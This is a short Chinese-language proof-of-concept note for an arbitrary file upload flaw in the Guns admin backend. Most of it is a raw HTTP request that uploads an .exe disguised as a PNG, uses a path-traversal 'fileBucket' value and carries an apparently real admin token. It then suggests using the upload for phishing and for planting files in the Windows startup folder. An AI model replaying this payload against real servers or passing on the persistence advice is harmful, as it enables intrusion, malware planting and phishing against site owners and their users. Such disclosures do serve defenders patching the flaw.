# Guns后台任意文件上传漏洞

Guns后台任意文件上传漏洞

## poc

```javascript
POST /api/sysFileInfo/upload HTTP/1.1
Host: 192.168.91.130:9000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.91.1:9000/system/structure/user
Authorization: eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySWQiOjEzMzk1NTA0Njc5Mzk2MzkyOTksImFjY291bnQiOiJhZG1pbiIsInV1aWQiOiI1NmQzZjczNy1hNjU1LTRjYzgtODRkNi0xNDdjYTE1M2Y5OGIiLCJyZW1lbWJlck1lIjpmYWxzZSwiZXhwaXJhdGlvbkRhdGUiOjE3MzUxMDM0MDM0ODgsImNhVG9rZW4iOm51bGwsIm90aGVycyI6bnVsbCwic3ViIjoiMTMzOTU1MDQ2NzkzOTYzOTI5OSIsImlhdCI6MTczNDQ5ODYwMywiZXhwIjoxNzM1MTAzNDAzfQ.Ur3bUwltSXWUtIT1OOR4MV4frJeRy_MDEkmYg99F5L2DOx6C4ha_y476dTWMy7gAJZsq5x_2C_VEkWxWv7uHXw
Content-Type: multipart/form-data; boundary=---------------------------4047569836919132683218702
Content-Length: 510
Origin: http://192.168.91.130:9000
Connection: close

-----------------------------4047569836919132683218702
Content-Disposition: form-data; name="file"; filename=".exe"
Content-Type: image/png

1111
-----------------------------4047569836919132683218702
Content-Disposition: form-data; name="secretFlag"

N
-----------------------------4047569836919132683218702
Content-Disposition: form-data; name="fileBucket"

../../../../../../../../../../../../../../../../../../看到请点击exe备份
-----------------------------4047569836919132683218702--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412300945840.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412300946118.png)

可以用在钓鱼，如果项目在c盘，可以放到启动项中，
这里可以看到是在哪个盘

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412300946901.png)

## 漏洞来源

- https://xz.aliyun.com/t/16808?time__1311=Gui%3DGIfDODkD%2FD0lD2DUxQw860LQcrpD#toc-0